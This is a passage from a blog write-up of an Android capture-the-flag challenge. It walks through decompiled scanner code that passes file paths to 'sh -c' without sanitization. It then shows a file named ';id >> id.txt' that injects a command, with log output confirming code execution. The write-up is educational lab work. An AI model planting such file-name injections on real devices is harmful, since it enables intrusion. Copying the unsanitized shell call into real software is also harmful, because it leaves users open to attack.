</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>((Object) <span style="color:#e6db74">&#34;finished file scan!&#34;</span>);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (InterruptedException e) {
</span></span><span style="display:flex;"><span>        Thread.<span style="color:#a6e22e">currentThread</span>().<span style="color:#a6e22e">interrupt</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    Message $this$handleMessage_u24lambda_u241 <span style="color:#f92672">=</span> obtainMessage();
</span></span><span style="display:flex;"><span>    $this$handleMessage_u24lambda_u241.<span style="color:#a6e22e">arg1</span> <span style="color:#f92672">=</span> msg.<span style="color:#a6e22e">arg1</span>;
</span></span><span style="display:flex;"><span>    sendMessageDelayed($this$handleMessage_u24lambda_u241, ScanService.<span style="color:#a6e22e">SCAN_INTERVAL</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>In the <code>ScanService</code>, it will trigger this <code>handleMessage</code> function after the <code>onStartCommand</code> function send message succesfully. In the <code>handleMessage</code>, it will get externals storage directory using <code>Environment.getExternalStorageDirectory()</code> and it will go through a for loop to get every files. Each of the files will go through this <code>ScanEngine.INSTANCE.scanFile</code>.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-1"> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-2"> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-3"> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-4"> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-5"> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-6"> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-7"> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-8"> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-9"> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-10">10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-11">11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-12">12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-13">13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-14">14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-15">15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-16">16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-17">17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-18">18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-19">19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-20">20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-21"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-21">21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-22"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-22">22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-23"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-23">23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-3-24"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-3-24">24</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">scanFile</span>(File file) {
</span></span><span style="display:flex;"><span>    Intrinsics.<span style="color:#a6e22e">checkNotNullParameter</span>(file, <span style="color:#e6db74">&#34;file&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        String command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;toybox sha1sum &#34;</span> <span style="color:#f92672">+</span> file.<span style="color:#a6e22e">getAbsolutePath</span>();
</span></span><span style="display:flex;"><span>        Process process <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ProcessBuilder(<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>).<span style="color:#a6e22e">command</span>(<span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, command).<span style="color:#a6e22e">directory</span>(Environment.<span style="color:#a6e22e">getExternalStorageDirectory</span>()).<span style="color:#a6e22e">redirectErrorStream</span>(<span style="color:#66d9ef">true</span>).<span style="color:#a6e22e">start</span>();
</span></span><span style="display:flex;"><span>        InputStream inputStream <span style="color:#f92672">=</span> process.<span style="color:#a6e22e">getInputStream</span>();
</span></span><span style="display:flex;"><span>        Intrinsics.<span style="color:#a6e22e">checkNotNullExpressionValue</span>(inputStream, <span style="color:#e6db74">&#34;getInputStream(...)&#34;</span>);
</span></span><span style="display:flex;"><span>        Reader inputStreamReader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InputStreamReader(inputStream, Charsets.<span style="color:#a6e22e">UTF_8</span>);
</span></span><span style="display:flex;"><span>        BufferedReader bufferedReader <span style="color:#f92672">=</span> inputStreamReader <span style="color:#66d9ef">instanceof</span> BufferedReader <span style="color:#f92672">?</span> (BufferedReader) inputStreamReader : <span style="color:#66d9ef">new</span> BufferedReader(inputStreamReader, 8192);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            BufferedReader reader <span style="color:#f92672">=</span> bufferedReader;
</span></span><span style="display:flex;"><span>            String output <span style="color:#f92672">=</span> reader.<span style="color:#a6e22e">readLine</span>();
</span></span><span style="display:flex;"><span>            Intrinsics.<span style="color:#a6e22e">checkNotNull</span>(output);
</span></span><span style="display:flex;"><span>            Object fileHash <span style="color:#f92672">=</span> StringsKt.<span style="color:#a6e22e">substringBefore$default</span>(output, <span style="color:#e6db74">&#34;  &#34;</span>, (String) <span style="color:#66d9ef">null</span>, 2, (Object) <span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span>            Unit unit <span style="color:#f92672">=</span> Unit.<span style="color:#a6e22e">INSTANCE</span>;
</span></span><span style="display:flex;"><span>            Closeable.<span style="color:#a6e22e">closeFinally</span>(bufferedReader, <span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span>ScanEngine.<span style="color:#a6e22e">KNOWN_MALWARE_SAMPLES</span>.<span style="color:#a6e22e">containsValue</span>(fileHash);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">finally</span> {
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>        e.<span style="color:#a6e22e">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>In the <code>ScanEngine.INSTANCE.scanFile</code> function, it is running bash command by using <code>&quot;toybox sha1sum&quot; + file.getAbsolutePath()</code> and it will pass to <code>command(&quot;sh&quot;, &quot;-c&quot;, command)</code>. Looking into the code, it seems like it do not have any input validation or sanitization which mean I could perform RCE if I can just add a file with specific name in the external storage directory.</p>
<h3 id="dynamic-analysis">Dynamic Analysis<a hidden class="anchor" aria-hidden="true" href="#dynamic-analysis">#</a></h3>
<p>After having a basic understanding from static analysis, I tried to play around with it and see how it works.</p>
<p><img alt="alt text" loading="lazy" src="/posts/mhl-cyclic-scanner/img/index.png#center"></p>
<p>Here&rsquo;s the <code>MainActivity</code> where it has a button to enable the scanner. After clicking it, it only have a simple toast.</p>
<p><img alt="alt text" loading="lazy" src="/posts/mhl-cyclic-scanner/img/index-1.png#center"></p>
<p>After enabling it, look into the logcat.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-1">1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-2">2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-3">3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-4">4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-4-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-4-5">5</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>PS C:\Users\kskin<span style="color:#f92672">&gt;</span> adb logcat System<span style="color:#f92672">.</span>out:I <span style="color:#f92672">--</span>pid<span style="color:#f92672">=</span><span style="color:#ae81ff">9717</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span> <span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">26.867</span>  <span style="color:#ae81ff">9717</span> <span style="color:#ae81ff">10171</span> I System<span style="color:#f92672">.</span>out: <span style="color:#f92672">/</span>storage<span style="color:#f92672">/</span>emulated<span style="color:#f92672">/</span><span style="color:#ae81ff">0</span><span style="color:#f92672">/</span>Download<span style="color:#f92672">/</span>cacert<span style="color:#f92672">.</span>der<span style="color:#f92672">...</span>SAFE
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span><span style="color:#f92672">-</span><span style="color:#ae81ff">30</span> <span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">26.898</span>  <span style="color:#ae81ff">9717</span> <span style="color:#ae81ff">10171</span> I System<span style="color:#f92672">.</span>out: <span style="color:#f92672">/</span>storage<span style="color:#f92672">/</span>emulated<span style="color:#f92672">/</span><span style="color:#ae81ff">0</span><span style="color:#f92672">/</span>Music<span style="color:#f92672">/.</span>thumbnails<span style="color:#f92672">/.</span>database_uuid<span style="color:#f92672">...</span>SAFE
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Basically, it will go through a bunch of files from several directories such as <code>Download</code> and <code>Music</code>. I then tried to write a file with malicious name to perform RCE.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-1">1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-2">2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-3">3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-5-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-5-4">4</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1|beryllium:/sdcard/Download <span style="color:#75715e"># echo &#39;&#39; &gt; &#39;;id &gt;&gt; id.txt&#39;</span>
</span></span><span style="display:flex;"><span>1|beryllium:/sdcard/Download <span style="color:#75715e"># ls -la</span>
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#ae81ff">1</span> root everybody    <span style="color:#ae81ff">1</span> 2025-03-30 14:18 ;id<span style="color:#ae81ff">\ </span>&gt;&gt;<span style="color:#ae81ff">\ </span>id.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>After that, just wait for the result from logcat and see if it works.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-1">1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-6-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-6-2">2</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ae81ff">03</span>-<span style="color:#ae81ff">30</span> <span style="color:#ae81ff">14</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">22.927</span>  <span style="color:#ae81ff">9717</span> <span style="color:#ae81ff">10171</span> I System.out<span style="color:#960050;background-color:#1e0010">:</span> /storage/emulated/<span style="color:#ae81ff">0</span>/Download/;id &gt;&gt; id.txt...SAFE
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span>-<span style="color:#ae81ff">30</span> <span style="color:#ae81ff">14</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">21</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">23.040</span>  <span style="color:#ae81ff">9717</span> <span style="color:#ae81ff">10171</span> I System.out<span style="color:#960050;background-color:#1e0010">:</span> /storage/emulated/<span style="color:#ae81ff">0</span>/id.txt...SAFE
</span></span></code></pre></td></tr></table>
</div>
</div><p>In the logcat, It managed to perform RCE and created another file named <code>id.txt</code>.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-1">1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-2">2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-3">3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-4">4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-5">5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-6">6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-7">7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-8">8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-7-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-7-9">9</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>beryllium:/sdcard <span style="color:#75715e"># ls -la id.txt</span>
</span></span><span style="display:flex;"><span>-rw-rw---- <span style="color:#ae81ff">1</span> root everybody <span style="color:#ae81ff">1176</span> 2025-03-30 14:22 id.txt
</span></span><span style="display:flex;"><span>beryllium:/sdcard <span style="color:#75715e"># cat id.txt</span>
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span>,1077<span style="color:#f92672">(</span>external_storage<span style="color:#f92672">)</span>,3003<span style="color:#f92672">(</span>inet<span style="color:#f92672">)</span>,9997<span style="color:#f92672">(</span>everybody<span style="color:#f92672">)</span>,20228<span style="color:#f92672">(</span>u0_a228_cache<span style="color:#f92672">)</span>,50228<span style="color:#f92672">(</span>all_a228<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>u:r:untrusted_app:s0:c228,c256,c512,c768
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span>,1077<span style="color:#f92672">(</span>external_storage<span style="color:#f92672">)</span>,3003<span style="color:#f92672">(</span>inet<span style="color:#f92672">)</span>,9997<span style="color:#f92672">(</span>everybody<span style="color:#f92672">)</span>,20228<span style="color:#f92672">(</span>u0_a228_cache<span style="color:#f92672">)</span>,50228<span style="color:#f92672">(</span>all_a228<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>u:r:untrusted_app:s0:c228,c256,c512,c768
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span>,1077<span style="color:#f92672">(</span>external_storage<span style="color:#f92672">)</span>,3003<span style="color:#f92672">(</span>inet<span style="color:#f92672">)</span>,9997<span style="color:#f92672">(</span>everybody<span style="color:#f92672">)</span>,20228<span style="color:#f92672">(</span>u0_a228_cache<span style="color:#f92672">)</span>,50228<span style="color:#f92672">(</span>all_a228<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>u:r:untrusted_app:s0:c228,c256,c512,c768
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span>,1077<span style="color:#f92672">(</span>external_storage<span style="color:#f92672">)</span>,3003<span style="color:#f92672">(</span>inet<span style="color:#f92672">)</span>,9997<span style="color:#f92672">(</span>everybody<span style="color:#f92672">)</span>,20228<span style="color:#f92672">(</span>u0_a228_cache<span style="color:#f92672">)</span>,50228<span style="color:#f92672">(</span>all_a228<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>u:r:untrusted_app:s0:c228,c256,c512,c768
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span>,1077<span style="color:#f92672">(</span>external_storage<span style="color:#f92672">)</span>,3003<span style="color:#f92672">(</span>inet<span style="color:#f92672">)</span>,9997<span style="color:#f92672">(</span>everybody<span style="color:#f92672">)</span>,20228<span style="color:#f92672">(</span>u0_a228_cache<span style="color:#f92672">)</span>,50228<span style="color:#f92672">(</span>all_a228<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>u:r:untrusted_app:s0:c228,c256,c512,c768
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>10228<span style="color:#f92672">(</span>u0_a228<span style="color:#f92672">)</span>,1077<span style="color:#f92672">(</span>external_storage<span style="color:#f92672">)</span>,3003<span style="color:#f92672">(</span>inet<span style="color:#f92672">)</span>,9997<span style="color:#f92672">(</span>everybody<span style="color:#f92672">)</span>,20228<span style="color:#f92672">(</span>u0_a228_cache<span style="color:#f92672">)</span>,50228<span style="color:#f92672">(</span>all_a228<span style="color:#f92672">)</span> context<span style="color:#f92672">=</span>u:r:untrusted_app:s0:c228,c256,c512,c768
</span></span></code></pre></td></tr></table>
</div>
</div><p>According to the result, it can easily know that the code is vulnerable to RCE.</p>
<h2 id="things-i-learned-from-this-challenge">Things I learned from this challenge<a hidden class="anchor" aria-hidden="true" href="#things-i-learned-from-this-challenge">#</a></h2>
<ul>
<li><code>adb logcat</code> to read the specific log</li>
<li>RCE in android</li>
<li>code reading</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://callmeks.github.io/tags/mhl/">MHL</a></li>
      <li><a href="https://callmeks.github.io/tags/android-ctf/">Android CTF</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://callmeks.github.io/posts/my-journey-of-cybersec/">
    <span class="title">« Prev</span>
    <br>
    <span>My Journey of Cybersec</span>
  </a>
  <a class="next" href="https://callmeks.github.io/posts/mhl-strings/">
    <span class="title">Next »</span>
    <br>
    <span>MHL Strings</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://callmeks.github.io/">KS Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script src='https://storage.ko-fi.com/cdn/scripts/overlay-widget.js'></script>
<script>
    kofiWidgetOverlay.draw('imkstho', {
        'type': 'floating-chat',
        'floating-chat.donateButton.text': 'Feed Mee',
        'floating-chat.donateButton.background-color': '#FF5E5B',
        'floating-chat.donatebutton.image': 'https://media.giphy.com/media/kgKFcQk6oa1WIdHNSl/giphy.gif',
        'floating-chat.donateButton.text-color': '#ffffff'
    });
</script>



